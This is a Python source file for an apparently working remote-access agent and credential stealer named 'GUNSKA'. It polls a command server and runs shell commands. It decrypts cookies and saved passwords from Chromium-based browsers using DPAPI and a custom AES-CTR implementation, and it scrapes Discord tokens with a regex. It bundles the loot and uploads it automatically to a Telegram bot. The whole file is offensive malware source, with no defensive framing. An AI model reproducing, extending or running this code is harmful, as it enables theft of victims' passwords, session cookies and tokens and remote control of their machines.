#!/usr/bin/env python3
"""GUNSKA agent — HTTPS long-poll, stdlib only. + auto-exfil Telegram."""
import base64
import glob
import hashlib
import json
import os
import platform
import random
import re
import secrets
import shutil
import sqlite3
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import urllib.parse
import urllib.request

BASE = "__BASE__"
TOKEN = "__TOKEN__"
NAME = "__NAME__"
TG_TOKEN = "__TGTOKEN__"
TG_CHAT = "__TGCHAT__"
TG = bool(TG_TOKEN and TG_CHAT and not TG_TOKEN.startswith("__") and not TG_CHAT.startswith("__"))

POLL = 1.0
CH = 512 * 1024
MAX_EXFIL = 45 * 1024 * 1024
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
SIDF = os.path.join(tempfile.gettempdir(), ".sid")
UPS = {}
DONE = {"auto": False}

TOKRE = re.compile(rb"(mfa\.[\w-]{80,90}|[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,45})")


def _sid():
    try:
        s = open(SIDF).read().strip()
        if len(s) == 16:
            return s
    except Exception:
        pass
    s = secrets.token_hex(8)
    try:
        with open(SIDF, "w") as f:
            f.write(s)
    except Exception:
        pass
    return s


SID = _sid()


def http(path, data=None, timeout=40):
    sep = "&" if "?" in path else "?"
    r = urllib.request.Request(BASE + path + sep + "t=" + TOKEN, data=data, headers=UA)
    with urllib.request.urlopen(r, timeout=timeout) as f:
        return f.read()


def post(o, timeout=40):
    try:
        http("/r/" + SID, json.dumps(o).encode(), timeout)
    except Exception:
        pass


def out(rid, txt):
    if txt:
        post({"t": "out", "id": rid, "d": txt})


def which(b):
    return shutil.which(b)


def sh(c, t=90):
    try:
        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        return "[timeout]\n"
    except Exception as e:
        return "ERR %s\n" % e


def info():
    d = {"host": platform.node(), "os": platform.platform(), "arch": platform.machine(),
         "user": os.environ.get("USER") or os.environ.get("USERNAME") or "?",
         "cwd": os.getcwd(), "pid": os.getpid(), "python": sys.version.split()[0],
         "termux": os.environ.get("PREFIX", "").startswith("/data/data/com.termux")}
    try:
        s = __import__("socket").socket(2, 2)
        s.connect(("8.8.8.8", 80))
        d["ip"] = s.getsockname()[0]
        s.close()
    except Exception:
        d["ip"] = "?"
    return d


# ---------------------------------------------------------------- telegram
def tg_text(txt):
    if not TG:
        return False
    try:
        data = urllib.parse.urlencode({"chat_id": TG_CHAT, "text": txt[:3800],
                                       "disable_web_page_preview": "true"}).encode()
        r = urllib.request.Request("https://api.telegram.org/bot%s/sendMessage" % TG_TOKEN,
                                   data=data, headers=UA)
        urllib.request.urlopen(r, timeout=40).read()
        return True
    except Exception:
        return False


def tg_doc(path, caption=""):
    if not TG:
        return False
    try:
        if os.path.getsize(path) > 48 * 1024 * 1024:
            return False
        bnd = "----g" + secrets.token_hex(8)
        pre = []
        for k, v in (("chat_id", TG_CHAT), ("caption", caption[:900])):
            if v:
                pre.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                            % (bnd, k, v)).encode())
        body = b"".join(pre)
        body += ("--%s\r\nContent-Disposition: form-data; name=\"document\"; filename=\"%s\"\r\n"
                 "Content-Type: application/octet-stream\r\n\r\n"
                 % (bnd, os.path.basename(path).replace('"', "_"))).encode()
        with open(path, "rb") as f:
            body += f.read()
        body += ("\r\n--%s--\r\n" % bnd).encode()
        r = urllib.request.Request("https://api.telegram.org/bot%s/sendDocument" % TG_TOKEN,
                                   data=body, headers={"Content-Type":
                                   "multipart/form-data; boundary=" + bnd, "User-Agent": UA["User-Agent"]})
        urllib.request.urlopen(r, timeout=240).read()
        return True
    except Exception:
        return False


# ---------------------------------------------------------------- crypto
def _dpapi(blob):
    """CryptUnprotectData — Windows only."""
    if os.name != "nt":
        return None
    import ctypes
    from ctypes import wintypes

    class BLOB(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

    def mk(b):
        buf = ctypes.create_string_buffer(b, len(b))
        return BLOB(len(b), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char))), buf

    bi, _keep = mk(blob)
    bo = BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
        return None
    data = ctypes.string_at(bo.pbData, bo.cbData)
    ctypes.windll.kernel32.LocalFree(bo.pbData)
    return data


_SBOX = bytes.fromhex(
    "637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0"
    "b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b275"
    "09832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cf"
    "d0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2"
    "cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdb"
    "e0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08"
    "ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9e"
    "e1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16")


def _xt(a):
    return ((a << 1) ^ 0x1b) & 0xff if a & 0x80 else a << 1


def _expand(key):
    nk, nr = len(key) // 4, len(key) // 4 + 6
    w = [list(key[4 * i:4 * i + 4]) for i in range(nk)]
    rc = 1
    for i in range(nk, 4 * (nr + 1)):
        t = list(w[i - 1])
        if i % nk == 0:
            t = [_SBOX[b] for b in t[1:] + t[:1]]
            t[0] ^= rc
            rc = _xt(rc)
        elif nk > 6 and i % nk == 4:
            t = [_SBOX[b] for b in t]
        w.append([w[i - nk][j] ^ t[j] for j in range(4)])
    return w, nr


def _ark(s, w, r):
    for i in range(16):
        s[i] ^= w[4 * r + i // 4][i % 4]


def _shift(s):
    for row in range(1, 4):
        i = [row + 4 * c for c in range(4)]
        v = [s[x] for x in i]
        v = v[row:] + v[:row]
        for c in range(4):
            s[i[c]] = v[c]


def _mix(s):
    for c in range(4):
        i = 4 * c
        a = s[i:i + 4]
        t = a[0] ^ a[1] ^ a[2] ^ a[3]
        s[i] = a[0] ^ t ^ _xt(a[0] ^ a[1])
        s[i + 1] = a[1] ^ t ^ _xt(a[1] ^ a[2])
        s[i + 2] = a[2] ^ t ^ _xt(a[2] ^ a[3])
        s[i + 3] = a[3] ^ t ^ _xt(a[3] ^ a[0])


def _enc(block, w, nr):
    s = list(block)
    _ark(s, w, 0)
    for r in range(1, nr):
        for i in range(16):
            s[i] = _SBOX[s[i]]
        _shift(s)
        _mix(s)
        _ark(s, w, r)
    for i in range(16):
        s[i] = _SBOX[s[i]]
    _shift(s)
    _ark(s, w, nr)
    return bytes(s)


def _ctr(key, nonce, data):
    w, nr = _expand(key)
    o = bytearray()
    c = 1
    for i in range(0, len(data), 16):
        ks = _enc(nonce + c.to_bytes(4, "big"), w, nr)
        o += bytes(x ^ y for x, y in zip(data[i:i + 16], ks))
        c += 1
    return bytes(o)


def _dec(val, key, host=""):
    """Chrome v10/v11/v20 cookie & password blob -> clear text."""
    if isinstance(val, str):
        return val
    if not val:
        return ""
    if val[:3] in (b"v10", b"v11", b"v20"):
        if not key or len(val) < 32:
            return ""
        try:
            p = _ctr(key, val[3:15], val[15:-16])
        except Exception:
            return ""
        if host and p[:32] == hashlib.sha256(host.encode()).digest():
            p = p[32:]
        return p.decode("utf-8", "replace")
    return val.decode("utf-8", "replace")


def _master_key():
    if os.name != "nt":
        return None
    la = os.environ.get("LOCALAPPDATA", "")
    for b in (la + "\\Google\\Chrome\\User Data",
              la + "\\Microsoft\\Edge\\User Data",
              la + "\\BraveSoftware\\Brave-Browser\\User Data"):
        p = os.path.join(b, "Local State")
        if not os.path.isfile(p):
            continue
        try:
            j = json.load(open(p, encoding="utf-8"))
            k = _dpapi(base64.b64decode(j["os_crypt"]["encrypted_key"])[5:])
            if k:
                return k
        except Exception:
            pass
    return None


# ---------------------------------------------------------------- paths
def _browsers():
    h = os.path.expanduser("~")
    res = []
    if os.name == "nt":
        la = os.environ.get("LOCALAPPDATA", "")
        ra = os.environ.get("APPDATA", "")
        bases = [("chrome", la + "\\Google\\Chrome\\User Data"),
                 ("edge", la + "\\Microsoft\\Edge\\User Data"),
                 ("brave", la + "\\BraveSoftware\\Brave-Browser\\User Data"),
                 ("vivaldi", la + "\\Vivaldi\\User Data"),
                 ("yandex", la + "\\Yandex\\YandexBrowser\\User Data"),
                 ("opera", ra + "\\Opera Software\\Opera Stable"),
                 ("operagx", ra + "\\Opera Software\\Opera GX Stable")]
    elif sys.platform == "darwin":
        a = h + "/Library/Application Support"
        bases = [("chrome", a + "/Google/Chrome"), ("edge", a + "/Microsoft Edge"),
                 ("brave", a + "/BraveSoftware/Brave-Browser"), ("vivaldi", a + "/Vivaldi"),
                 ("opera", a + "/com.operasoftware.Opera")]
    else:
        c = h + "/.config"
        bases = [("chrome", c + "/google-chrome"), ("chromium", c + "/chromium"),
                 ("brave", c + "/BraveSoftware/Brave-Browser"),
                 ("edge", c + "/microsoft-edge"), ("vivaldi", c + "/vivaldi"),
                 ("opera", c + "/opera"),
                 ("android_chrome", "/data/data/com.android.chrome/app_chrome/Default")]
    for lbl, b in bases:
        if not os.path.isdir(b):
            continue
        if os.path.isdir(os.path.join(b, "Default")):
            for p in sorted(glob.glob(os.path.join(b, "Default")) +
                            glob.glob(os.path.join(b, "Profile *"))):
                if os.path.isdir(p):
                    res.append((lbl + "_" + os.path.basename(p).replace(" ", ""), p))
        else:
            res.append((lbl, b))
    return res


def _discord():
    h = os.path.expanduser("~")
    if os.name == "nt":
        ra = os.environ.get("APPDATA", "")
        la = os.environ.get("LOCALAPPDATA", "")
        c = [os.path.join(ra, x) for x in ("discord", "discordcanary", "discordptb", "Lightcord")]
        c += [os.path.join(la, x) for x in ("Discord", "DiscordCanary", "DiscordPTB")]
    elif sys.platform == "darwin":
        a = h + "/Library/Application Support"
        c = [a + "/" + x for x in ("discord", "discordcanary", "discordptb", "Lightcord")]
    else:
        c = [h + "/.config/" + x for x in ("discord", "discordcanary", "discordptb", "Lightcord")]
        c += ["/data/data/com.discord/files"]
    return [p for p in c if os.path.isdir(p)]


def _rootcopy(src, dst):
    try:
        shutil.copy2(src, dst)
        return True
    except Exception:
        pass
    if which("su"):
        sh("su -c 'cp \"%s\" \"%s\"' 2>/dev/null" % (src, dst), t=25)
        return os.path.exists(dst)
    return False


# ---------------------------------------------------------------- harvest
def _cookies(d):
    key = _master_key()
    reps = []
    for lbl, prof in _browsers():
        db = None
        for c in ("Network/Cookies", "Cookies"):
            p = os.path.join(prof, c)
            if os.path.isfile(p) or os.path.isdir(p) and False:
                db = p
                break
        if not db:
            continue
        cp = os.path.join(tempfile.gettempdir(), "ck_%s.db" % secrets.token_hex(4))
        if not _rootcopy(db, cp):
            continue
        rows = ["# %s  %s" % (lbl, db)]
        try:
            con = sqlite3.connect(cp)
            for host, name, val, enc in con.execute(
                    "SELECT host_key,name,value,encrypted_value FROM cookies"):
                v = _dec(enc, key, host) if enc else (val or "")
                if v:
                    rows.append("%s\t%s\t%s" % (host, name, v))
            con.close()
        except Exception as e:
            rows.append("# err %s" % e)
        try:
            shutil.copy2(cp, os.path.join(d, "raw_%s_%s" % (lbl, os.path.basename(db))))
        except Exception:
            pass
        if len(rows) > 1:
            p = os.path.join(d, "cookies_%s.txt" % lbl)
            open(p, "w", encoding="utf-8", errors="replace").write("\n".join(rows))
            reps.append(p)
        try:
            os.remove(cp)
        except Exception:
            pass
    return reps


def _passwords(d):
    key = _master_key()
    reps = []
    for lbl, prof in _browsers():
        db = os.path.join(prof, "Login Data")
        if not os.path.isfile(db):
            continue
        cp = os.path.join(tempfile.gettempdir(), "lg_%s.db" % secrets.token_hex(4))
        if not _rootcopy(db, cp):
            continue
        rows = ["# %s" % db]
        try:
            con = sqlite3.connect(cp)
            for url, user, pw in con.execute(
                    "SELECT origin_url,username_value,password_value FROM logins"):
                p = _dec(pw, key)
                if user or p:
                    rows.append("%s\t%s\t%s" % (url, user, p))
            con.close()
        except Exception as e:
            rows.append("# err %s" % e)
        if len(rows) > 1:
            p = os.path.join(d, "passwords_%s.txt" % lbl)
            open(p, "w", encoding="utf-8", errors="replace").write("\n".join(rows))
            reps.append(p)
        try:
            os.remove(cp)
        except Exception:
            pass
    return reps


def _tokens(d):
    found = set()
    dirs = []
    for _lbl, prof in _browsers():
        dirs.append(os.path.join(prof, "Local Storage", "leveldb"))
    for base in _discord():
        dirs.append(os.path.join(base, "Local Storage", "leveldb"))
    for src in dirs:
        if not os.path.isdir(src):
            continue
        for fn in glob.glob(os.path.join(src, "*")):
            if not os.path.isfile(fn) or os.path.getsize(fn) > 12 * 1024 * 1024:
                continue
            try:
                blob = open(fn, "rb").read()
            except Exception:
                continue
            for m in TOKRE.finditer(blob):
                found.add(m.group(1).decode("utf-8", "replace"))
    if not found:
        return []
    p = os.path.join(d, "discord_tokens.txt")
    open(p, "w").write("\n".join(sorted(found)))
    return [p]


def harvest(rid=None, mode="all"):
    d = tempfile.mkdtemp(prefix="ex_")
    got = []
    try:
        if mode in ("all", "cookies"):
            got += _cookies(d)
        if mode in ("all", "passwords"):
            got += _passwords(d)
        if mode in ("all", "tokens"):
            got += _tokens(d)

        i = info()
        sum_txt = ("host: %s\nuser: %s\nos: %s\nip: %s\nfiles: %d\n"
                   % (i["host"], i["user"], i["os"], i["ip"], len(got)))
        open(os.path.join(d, "summary.txt"), "w").write(sum_txt)
        if rid:
            out(rid, "[exfil] %s" % sum_txt.replace("\n", " | ") + "\n")
        if not TG:
            if rid:
                out(rid, "[exfil] TG ma msetach\n")
            return

        tp = os.path.join(tempfile.gettempdir(), "ex_%d.tar.gz" % time.time())
        with tarfile.open(tp, "w:gz") as tf:
            for p in got:
                tf.add(p, arcname=os.path.basename(p))
            tf.add(os.path.join(d, "summary.txt"), arcname="summary.txt")
        cap = "%s / %s / %s" % (i["host"], i["user"], i["ip"])
        ok = tg_doc(tp, cap) if os.path.getsize(tp) <= MAX_EXFIL else False
        if ok:
            if rid:
                out(rid, "[exfil] sift l telegram (%d b)\n" % os.path.getsize(tp))
        else:
            for p in got[:12]:
                tg_doc(p, cap)
            tg_text("%s\n%s" % (cap, sum_txt))
            if rid:
                out(rid, "[exfil] sift f joj (tar kbir wla TG err)\n")
        try:
            os.remove(tp)
        except Exception:
            pass
    except Exception as e:
        if rid:
            out(rid, "ERR exfil %s\n" % e)
    finally:
        shutil.rmtree(d, ignore_errors=True)


def auto_exfil():
    if DONE["auto"] or not TG:
        return
    DONE["auto"] = True
    time.sleep(3)
    harvest(None, "all")
